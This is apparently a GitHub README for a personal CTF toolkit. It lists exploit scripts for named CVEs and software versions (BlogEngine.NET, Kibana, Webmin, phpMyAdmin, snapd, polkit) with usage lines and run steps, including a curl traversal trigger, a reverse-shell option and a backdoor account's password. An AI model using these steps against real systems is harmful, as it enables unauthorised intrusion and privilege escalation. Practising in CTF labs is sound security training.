# ctf

A collection of exploits, documents and code I have used for CTFs

## Exploits

### FootHold

**BlogEngine_NET_LessThan_3_3_6.cs**

Athenticated RCE

```CVE-2019-6714``` 

Run by: 
- Set up listener
- Changing the file name to PostView.ascx.
- Upload through file manager in BlogNet (editing a post and clicking on the icon that looks like an open file in the toolbar)
- Activate by ```curl http://ip/?theme=../../App_Data/files```

 
**Fuel_CMS_1_4_1_RCE.py**        

Unathenticated RCE

usage ```python3 -u [URL]```

**KiBa_cve-2019-7609.py**

RCE

usage ``` python3 KiBa_cve-2019-7609.py -u [URL] -host [HOST URL] -port [REMOTE PORT] --shell```

**osCommerce2_3_4RCE.py***            

Unathenticated RCE 

usage ```python3 osCommerce2_3_4RCE.py [URL]```


**Traffic_Offense_Management_System_1_0_RcE.py**

Unathenticated RCE

usage ```python3 Traffic_Offense_Management_System_1_0_RcE.py```


**CMS_MaDe_Simple_lessThan_2_2_9_SQLi.py**

Unauthenticated SQLi to retrieve passwords.

usage ```python2 CMS_MaDe_Simple_lessThan_2_2_9_SQLi.py```

**HttpFileServer_2_3_x_RcE.py**

RCE

usage ```python2 exploit.py [TARGET IP ADDRESS]  [TARGET PORT NUMBER]```

**nostromo_1_9_6_RCE.py**
 
RCE

usage ```python3 nostromo_1_9_6_RCE.py [TARGET IP] [TARGET PORT] [COMMAND]```

**PhpMyAdmin_4_3_0-4_6_2_RcE.py**

Athenticated RCE

usage ```python3 PhpMyAdmin_4_3_0-4_6_2_RcE.py -c [CMD] -u [USER] -p [PWD] -d [DBS] -T [TABLE] url```

**Webmin_1_890-1_920_RCE.py**

Based on metasploit module.

Unathenticated RCE

Usage ```python3 Webmin_1_890-1_920_RCE.py -p [PORT] [URL]```

warning needs prompt installed

**Online_Book_Store_1_0_RcE.py**

Unauthenticated RCE

Usage ```python3 Online_Book_Store_1_0_RcE.py [URL]```

### PrivEsc

**alpine_exploit.sh**

exploit using the apline   


**dirty_sock.py** and **dirt_sock_V2.py**

dity_sock.py is better but can try both

Works for ```snapd``` 2.37.1 and less.

dity_sock.py needs internet access and SSH service.
dity_sock_V2.py doesn't and also works on non ubuntu systems 

To run dirty_sock.py:
- Create an account at <a href="https://login.ubuntu.com/" target="_blank">Ubuntu SSO</a>
- After confirming it, edit your profile and upload an SSH public key.
- ```python3 dirty_sock.py -u "you@yourmail.com" -k "id_rsa"```

dirty_sock_V2.py: 
- usage ```python3 dirty_sock_V2.py```
- ```su dirty_sock``` password ```dirty_sock```

**polkit_exploit.sh** and **polkit.py**

python and bash implementation of CVE-2021-3560

usage ```python3 polkit.py```